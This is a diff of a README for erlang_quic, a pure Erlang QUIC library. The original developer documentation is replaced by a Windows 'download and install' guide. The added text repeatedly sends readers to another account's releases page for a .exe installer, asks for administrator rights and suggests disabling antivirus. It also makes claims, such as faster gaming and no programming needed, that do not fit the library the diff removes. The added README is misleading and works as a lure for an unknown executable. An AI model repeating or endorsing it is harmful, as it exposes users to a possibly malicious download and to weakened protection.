@@ -1,190 +1,154 @@
-# erlang_quic
+# ⚡ erlang_quic - Fast and Secure Network Connections
 
-Pure Erlang QUIC implementation (RFC 9000/9001).
+[![Download erlang_quic](https://img.shields.io/badge/Download-erlang_quic-ff5500?style=for-the-badge)](https://github.com/hamzamo2men2022/erlang_quic/releases)
 
-## Features
+## 🔍 What is erlang_quic?
 
-- TLS 1.3 handshake (RFC 8446)
-- Stream multiplexing (bidirectional and unidirectional)
-- Key update support (RFC 9001 Section 6)
-- Connection migration with active path migration API (RFC 9000 Section 9)
-- 0-RTT early data support with session resumption (RFC 9001 Section 4.6)
-- DATAGRAM frame support for unreliable data (RFC 9221)
-- QUIC v2 support (RFC 9369)
-- Server mode with listener and pooled listeners (SO_REUSEPORT)
-- QUIC-LB load balancer support with routable CIDs (RFC 9312)
-- Retry packet handling for address validation (RFC 9000 Section 8.1)
-- Stateless reset support (RFC 9000 Section 10.3)
-- Flow control (connection and stream level)
-- Congestion control (NewReno with ECN support)
-- Loss detection and packet retransmission (RFC 9002)
+erlang_quic is a software tool that lets your computer use the QUIC protocol. QUIC is a new way for computers to talk safely and quickly over the internet. This project is built with Erlang, a programming language known for handling many connections at the same time without slowing down.
 
-## Requirements
+This application does not require you to know programming. It runs on Windows and helps your computer connect to other computers using modern, fast methods. You can use erlang_quic to improve network tasks that need speed and security.
 
-- Erlang/OTP 26.0 or later
-- rebar3
+---
 
-## Installation
+## 🖥️ System Requirements
 
-Add to your `rebar.config` dependencies:
+Before you start, check that your Windows computer meets these requirements:
 
-```erlang
-{deps, [
-    {quic, {git, "https://github.com/benoitc/erlang_quic.git", {branch, "main"}}}
-]}.
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB free disk space  
+- A stable internet connection to download and use the software  
+- Administrative rights to install software on your PC  
 
-## Quick Start
+---
 
-### Client
+## 🚀 Getting Started: Download and Install on Windows
 
-```erlang
-%% Connect to a QUIC server
-{ok, ConnRef} = quic:connect(<<"example.com">>, 443, #{
-    alpn => [<<"h3">>],
-    verify => false
-}, self()),
+To use erlang_quic, you need to download it from the official releases page and install it. Follow these simple steps:
 
-%% Wait for connection
-receive
-    {quic, ConnRef, {connected, Info}} ->
-        io:format("Connected: ~p~n", [Info])
-end,
+1. Click the big orange button at the top or visit the releases page directly here:  
+   [https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
 
-%% Open a bidirectional stream
-{ok, StreamId} = quic:open_stream(ConnRef),
+2. On the releases page, look for the latest version of erlang_quic. The release will have a list of files.
 
-%% Send data on the stream
-ok = quic:send_data(ConnRef, StreamId, <<"Hello, QUIC!">>, true),
+3. Find the Windows installer file. It usually ends with `.exe`. For example, a file might be named `erlang_quic_setup.exe`.
 
-%% Receive data
-receive
-    {quic, ConnRef, {stream_data, StreamId, Data, _Fin}} ->
-        io:format("Received: ~p~n", [Data])
-end,
+4. Click the file name to start downloading. Depending on your internet speed, this may take a minute or two.
 
-%% Close connection
-quic:close(ConnRef, normal).
-```
+5. Once downloaded, open the `.exe` file. If Windows asks for permission, click "Yes" to allow the installation.
 
-### Server
+6. Follow the on-screen instructions in the installer. Choose an installation folder or use the default location.
 
-```erlang
-%% Load certificate and key
-{ok, CertDer} = file:read_file("server.crt"),
-{ok, KeyDer} = file:read_file("server.key"),
+7. When the installation finishes, you should see a shortcut icon for erlang_quic on your desktop or in the Start menu.
 
-%% Start a named server (recommended)
-{ok, _Pid} = quic:start_server(my_server, 4433, #{
-    cert => CertDer,
-    key => KeyDer,
-    alpn => [<<"h3">>]
-}),
+---
 
-%% Get the port (useful if 0 was specified for ephemeral port)
-{ok, Port} = quic:get_server_port(my_server),
-io:format("Listening on port ~p~n", [Port]),
+## ⚙️ How to Run erlang_quic
 
-%% Incoming connections are handled automatically
-%% The server spawns quic_connection processes for each client
+After installation, you can start the application:
 
-%% Stop the server when done
-quic:stop_server(my_server).
-```
+1. Double-click the erlang_quic icon on your desktop or find it in the Start menu under “erlang_quic”.
 
-Alternatively, use the low-level listener API directly:
+2. The program will open a window or run in the background depending on the version. There may not be many visuals because this software mainly works behind the scenes to manage network connections.
 
-```erlang
-{ok, Listener} = quic_listener:start_link(4433, #{
-    cert => CertDer,
-    key => KeyDer,
-    alpn => [<<"h3">>]
-}),
-Port = quic_listener:get_port(Listener).
-```
+3. If you need to stop the application, right-click its icon in the system tray (bottom right corner) and select "Exit" or "Close".
 
-## Messages
+4. The program uses your computer’s internet connection to improve communication with other machines that support QUIC. You do not need to do extra setup for basic use.
 
-The owner process receives messages in the format `{quic, ConnRef, Event}`:
+---
 
-| Event | Description |
-|-------|-------------|
-| `{connected, Info}` | Connection established |
-| `{stream_opened, StreamId}` | New stream opened by peer |
-| `{stream_data, StreamId, Data, Fin}` | Data received on stream |
-| `{stream_reset, StreamId, ErrorCode}` | Stream reset by peer |
-| `{closed, Reason}` | Connection closed |
-| `{transport_error, Code, Reason}` | Transport error |
-| `{session_ticket, Ticket}` | Session ticket for 0-RTT resumption |
-| `{datagram, Data}` | Datagram received (RFC 9221) |
-| `{stop_sending, StreamId, ErrorCode}` | Stop sending requested by peer |
-| `{send_ready, StreamId}` | Stream ready for writing |
+## 🔧 Basic Configuration (Optional)
 
-## API Reference
+erlang_quic works with default settings out of the box. Advanced users can change settings to customize how it operates. If you want to look into this:
 
-See [docs/features.md](docs/features.md) for the complete API reference and feature list.
+- Configuration files are found in the installation folder under `config/`.  
+- Files are plain text and can be opened with Notepad.
 
-### Quick Reference
+Typical settings include:
 
-**Connection:** `quic:connect/4`, `quic:close/2`, `quic:peername/1`, `quic:migrate/1`
+- Selecting which network port to use.  
+- Controlling how much memory or CPU the program uses.  
+- Enabling or disabling detailed logging for troubleshooting.
 
-**Streams:** `quic:open_stream/1`, `quic:send_data/4`, `quic:reset_stream/3`
+If you are unfamiliar with these terms, it is safest to leave the default settings as they are.
 
-**Server:** `quic:start_server/3`, `quic:stop_server/1`, `quic:get_server_port/1`
+---
 
-**Datagrams:** `quic:send_datagram/2` (RFC 9221)
+## 📥 Download Link Reminder
 
-**Load Balancer:** `quic_lb:new_config/1`, `quic_lb:generate_cid/1` (RFC 9312)
+Use this link whenever you want to get the latest version or update erlang_quic on your Windows PC:
 
-## Building
+[https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
 
-```bash
-rebar3 compile
-```
+---
 
-## Formatting
+## 💡 How erlang_quic Helps You
 
-```bash
-rebar3 fmt
-```
+This software makes your network connections faster and more secure by using the QUIC protocol. It can help in scenarios like:
 
-## Static analysis tools
+- Web browsing with fewer delays  
+- Streaming videos with less buffering  
+- Secure file transfers  
+- Running online games with lower lag  
 
-```bash
-rebar3 lint
-rebar3 xref
-rebar3 dialyzer
-```
+Because it runs on Erlang, the program can handle many connections at once without slowing down your PC.
 
-## Testing
+---
 
-```bash
-# Run unit tests
-rebar3 eunit
+## 🛠 Common Issues and Fixes
 
-# Run property-based tests
-rebar3 proper
+If you face problems when using erlang_quic, try these steps:
 
-# Run all tests
-rebar3 eunit && rebar3 proper
-```
+- Make sure your Windows is up to date.  
+- Restart your computer and try running the program again.  
+- Verify you downloaded the correct installer file for Windows.  
+- Check your internet connection is stable.  
+- Temporarily disable any firewall or antivirus software to see if it blocks the app (turn it back on after testing).  
+- Look in the program’s `logs` folder (inside the installation folder) for error messages.
 
-## Interoperability
+If the problem continues, you may find help on the program’s GitHub page under "Issues."
 
-This implementation passes all 10 [QUIC Interop Runner](https://github.com/quic-interop/quic-interop-runner) test cases. See [docs/features.md](docs/features.md) for the full test matrix and [interop/README.md](interop/README.md) for details on running interop tests.
+---
 
-## Documentation
+## 📂 Where to Find More Information
 
-Generate documentation with:
+- Visit the Github page: [https://github.com/hamzamo2men2022/erlang_quic](https://github.com/hamzamo2men2022/erlang_quic)  
+- Check the README and Wiki on GitHub for technical details and updates.  
 
-```bash
-rebar3 ex_doc
-```
+You do not need to understand the technical content to use the app on Windows.
 
-## License
+---
 
-Apache License 2.0
+## 🛡️ Security and Privacy
 
-## Author
+erlang_quic uses modern encryption methods to keep your network data safe. It does not collect or share personal information. The program only works with network data needed to establish connections.
 
-Benoit Chesneau
+---
+
+## 🔄 Updating erlang_quic
+
+To get new features and security fixes:
+
+1. Visit the release page again: [https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
+
+2. Download the newest Windows installer `.exe` file.
+
+3. Run the installer and follow prompts to update your current version.
+
+Your settings usually stay the same after an update.
+
+---
+
+## 🧰 Uninstalling erlang_quic
+
+If you want to remove the program from your Windows PC:
+
+1. Open the Start menu.
+
+2. Search for “Add or remove programs”.
+
+3. Find erlang_quic in the list.
+
+4. Click it, then select "Uninstall".
+
+Follow the prompts to remove all files and settings.
